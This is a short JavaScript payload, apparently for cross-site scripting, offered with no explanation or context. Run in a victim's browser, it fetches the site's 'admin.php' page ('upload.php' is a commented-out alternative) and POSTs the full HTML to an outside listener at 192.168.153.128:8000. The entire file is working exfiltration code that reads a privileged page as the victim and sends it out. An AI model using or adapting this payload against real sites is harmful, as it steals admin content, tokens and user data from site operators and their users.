path ="admin.php"
// path ="upload.php"
fetch(path).then(function (response) {

	return response.text();
}).then(function (html) {
    fetch("http://192.168.153.128:8000/content", {
            body: "url=" + encodeURIComponent(path) + "&content=" + encodeURIComponent(html),
            headers: {
                "Content-Type": "application/x-www-form-urlencoded"
            },
            method: "POST"
        })
}).catch(function (err) {
	// There was an error
	console.warn('Something went wrong.', err);
});
